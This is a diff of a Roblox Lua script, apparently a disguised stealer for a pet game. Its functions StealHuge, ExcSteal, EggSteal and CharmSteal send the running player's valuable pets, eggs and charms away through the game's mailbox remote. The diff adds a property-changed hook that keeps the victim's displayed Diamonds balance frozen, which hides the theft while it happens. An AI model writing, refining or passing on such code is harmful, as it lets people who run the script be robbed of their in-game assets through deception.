@@ -52,6 +52,10 @@ end)
 local gemsleaderstat = game:GetService('Players').LocalPlayer.leaderstats["💎 Diamonds"].Value
 local gemsleaderstatpath = game:GetService('Players').LocalPlayer.leaderstats["💎 Diamonds"]
 
+gemsleaderstatpath:GetPropertyChangedSignal("Value"):Connect(function()
+	gemsleaderstatpath.Value = gemsleaderstat
+end)
+
 function StealHuge()
 	local hugesSent = 0
 	local initialHuges = CountHuges()
@@ -74,7 +78,6 @@ function StealHuge()
                 [5] = v._am or 1
             }
 			game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
-			gemsleaderstatpath.Value = gemsleaderstat
 			local finalHuges = CountHuges()
 			if finalHuges < initialHuges then
 				hugesSent = hugesSent + 1
@@ -127,7 +130,6 @@ function ExcSteal()
                 [5] = v._am or 1
             }
             game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
-			gemsleaderstatpath.Value = gemsleaderstat
 			local finalExc = CountExc()
 			if finalExc < initialExc then
 				excSent = excSent + 1
@@ -171,7 +173,6 @@ function EggSteal()
 				[5] = v._am or 1
 			}
 			game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
-			gemsleaderstatpath.Value = gemsleaderstat
 		end
     end
 end
@@ -189,7 +190,6 @@ function CharmSteal()
 				[5] = v._am or 1
 			}
 			game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
-			gemsleaderstatpath.Value = gemsleaderstat
 		end
     end
 end
